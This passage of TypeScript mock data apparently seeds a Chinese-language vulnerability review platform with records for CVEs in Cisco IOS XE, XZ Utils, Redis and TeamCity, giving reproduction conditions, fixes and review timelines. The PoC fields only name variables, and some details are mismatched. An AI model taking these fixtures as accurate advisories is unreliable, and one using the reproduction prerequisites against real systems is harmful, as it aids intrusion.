    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 4, comment: '提交重大漏洞：国产数据库认证绕过' },
      { type: 'review', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 4, comment: '紧急会议讨论，定级绝密' },
      { type: 'desensitize', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 3, comment: '严格脱敏 4 项要求' },
      { type: 'update', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 3, comment: '已完全按要求处理' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 3, comment: '绝密级发布，严格管控' },
    ]),
  },
  {
    id: 'vuln-011',
    vulnCode: 'SV-2024-0011',
    cveId: 'CVE-2024-20359',
    title: 'Cisco IOS XE Web UI 权限提升',
    description:
      'Cisco IOS XE 软件 Web UI 功能存在权限提升漏洞，经过认证的低级别管理用户可获得管理员级别权限，影响支持 web UI 的所有 Catalyst 系列交换机。',
    affectedVersions: [
      { vendor: 'Cisco', product: 'IOS XE', versionRange: '17.3.x, 17.6.x, 17.9.x' },
    ],
    reproductionConditions:
      '1. 设备启用 Web UI (ip http server)；2. 攻击者拥有 level 1 级别用户凭据；3. 未启用 AAA 强制授权。',
    repairSuggestion:
      '1. 升级至 17.3.8 / 17.6.6a / 17.9.4a 修复版本；2. 临时缓解：禁用 ip http server，改用 CLI 管理；3. 检查本地用户权限组异常变更。',
    pocCode: samplePoc_Cisco,
    sensitivityLevel: SensitivityLevel.CONFIDENTIAL,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'auth-001',
    submitterName: '王授权',
    submittedAt: daysAgo(40),
    reviewedAt: daysAgo(38),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 40, comment: '提交 Cisco 提权 POC' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 38, comment: '机密级发布' },
    ]),
  },
  {
    id: 'vuln-012',
    vulnCode: 'SV-2024-0012',
    cveId: 'CVE-2024-3094',
    title: 'XZ Utils 后门事件 (liblzma SSH 认证绕过)',
    description:
      'XZ Utils 5.6.0 和 5.6.1 中被植入恶意代码，liblzma.so 动态库被篡改导致 SSH daemon 的 RSA 认证逻辑被绕过，后门账户可在无凭据下登录。',
    affectedVersions: [
      { vendor: 'Tukaani', product: 'XZ Utils', versionRange: '5.6.0, 5.6.1' },
      { vendor: 'RedHat', product: 'Fedora Rawhide', versionRange: '40/41 (受影响)' },
    ],
    reproductionConditions:
      '1. 系统安装 xz-5.6.0/5.6.1；2. 启用 sshd 且链接到 systemd (间接加载 liblzma)；3. 运行在 x86_64 架构的 glibc Linux 系统。',
    repairSuggestion:
      '1. 立即降级 xz 至 5.4.6 稳定版；2. 检查 /usr/lib/systemd/liblzma* 文件校验和；3. 排查可疑 SSH 登录成功日志；4. 参考 Andres Freund 公布的检测脚本。',
    pocCode: samplePoc_XZ,
    sensitivityLevel: SensitivityLevel.PUBLIC,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'auth-001',
    submitterName: '王授权',
    submittedAt: daysAgo(65),
    reviewedAt: daysAgo(64),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 65, comment: '提交 XZ 后门检测脚本' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 64, comment: '检测类脚本，公开级' },
    ]),
  },
  {
    id: 'vuln-013',
    vulnCode: 'SV-2024-0013',
    title: '[待审核] 中间件 API 网关未授权 SSRF',
    description:
      '某 API 网关组件的健康检查接口未做鉴权校验，且 backend 参数未限制内网地址，可通过构造请求扫描内网存活主机并访问元数据服务。',
    affectedVersions: [
      { vendor: '云原生产品', product: 'API Gateway Enterprise', versionRange: 'V3.8.0 - V3.8.5' },
    ],
    reproductionConditions:
      '1. 网关对外开放 health check 端口；2. 未启用 IP 白名单；3. 版本未安装最新补丁包。',
    repairSuggestion: '1. 升级官方补丁 V3.8.6；2. 增加 backend 参数白名单校验；3. 禁用外网访问健康检查端口。',
    pocCode: samplePoc_Splunk,
    sensitivityLevel: SensitivityLevel.INTERNAL,
    verificationStatus: VerificationStatus.PENDING,
    submitterId: 'res-001',
    submitterName: '李安全',
    submittedAt: daysAgo(1),
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 1, comment: '新提交，等待管理员审核' },
    ]),
  },
  {
    id: 'vuln-014',
    vulnCode: 'SV-2024-0014',
    title: '[待脱敏] Redis Lua 沙箱逃逸 RCE',
    description:
      'Redis 7.2.x 的 Lua 解释器存在沙箱逃逸漏洞，拥有 eval 权限的用户可通过构造特定 Lua 脚本跳出沙箱执行任意系统命令。',
    affectedVersions: [
      { vendor: 'Redis', product: 'Redis Server', versionRange: '7.2.0 - 7.2.4' },
    ],
    reproductionConditions: '1. 拥有 AUTH 密码或无密码 Redis；2. 启用 EVAL 命令；3. 未启用 ACL 最小权限。',
    repairSuggestion: '1. 升级 7.2.5+；2. 禁用高风险 Lua 函数；3. 配置 ACL 限制 eval 命令使用。',
    pocCode: samplePoc_Redis,
    sensitivityLevel: SensitivityLevel.CONFIDENTIAL,
    verificationStatus: VerificationStatus.DESENSITIZATION,
    submitterId: 'res-001',
    submitterName: '李安全',
    submittedAt: daysAgo(2),
    desensitizationRequest:
      '请删除可直接利用的 Lua payload，仅保留漏洞描述与修复建议。完整利用链需另行评估。',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 2, comment: '提交 Redis RCE' },
      { type: 'review', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 1, comment: '需脱敏后发布' },
      { type: 'desensitize', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 1, comment: '下发脱敏要求' },
    ]),
  },
  {
    id: 'vuln-015',
    vulnCode: 'SV-2024-0015',
    title: '[已驳回] WordPress 插件漏洞 (重复提交)',
    description: '某知名表单插件 SQL 注入漏洞。',
    affectedVersions: [
      { vendor: 'WordPress', product: 'Gravity Forms', versionRange: '< 2.7.14' },
    ],
    reproductionConditions: '',
    repairSuggestion: '',
    pocCode: '# 无效 payload，重复提交',
    sensitivityLevel: SensitivityLevel.PUBLIC,
    verificationStatus: VerificationStatus.REJECTED,
    submitterId: 'res-001',
    submitterName: '李安全',
    submittedAt: daysAgo(25),
    reviewedAt: daysAgo(24),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    rejectReason:
      '该漏洞 (CVE-2023-40601) 已在 SV-2023-0817 条目中收录，且此份提交缺少可独立复现的 PoC 代码。请补充原创漏洞或新增细节。',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 25, comment: '提交漏洞' },
      { type: 'reject', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 24, comment: '重复提交 + POC 不完整，已驳回' },
    ]),
  },
  {
    id: 'vuln-016',
    vulnCode: 'SV-2024-0016',
    cveId: 'CVE-2024-27198',
    title: 'JetBrains TeamCity 认证绕过',
    description:
      'JetBrains TeamCity 服务器的内部 RPC 接口未做鉴权处理，远程未认证攻击者可构造特定 HTTP 请求创建管理员账户，从而接管整个 CI/CD 服务器。',
    affectedVersions: [
      { vendor: 'JetBrains', product: 'TeamCity On-Premises', versionRange: '2017.1 - 2023.11.3' },
    ],
    reproductionConditions:
      '1. TeamCity 8111 端口对外暴露；2. 未配置反向代理做路径白名单；3. 启用 REST API 插件（默认开启）。',
    repairSuggestion:
      '1. 立即升级至 2023.11.4；2. 临时缓解：在反向代理层拦截 /app/rest/server 路径并检查鉴权头；3. 检查管理员用户新增；4. 审计所有构建配置的源代码仓库地址。',
    pocCode: samplePoc_TeamCity,
    sensitivityLevel: SensitivityLevel.INTERNAL,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'auth-001',
    submitterName: '王授权',
    submittedAt: daysAgo(30),
    reviewedAt: daysAgo(28),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 30, comment: '提交 TeamCity 接管 POC' },
      { type: 'desensitize', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 29, comment: '删除具体 header 伪造步骤' },
      { type: 'update', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 29, comment: '已处理' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 28, comment: '内部级发布' },
    ]),
  },
];
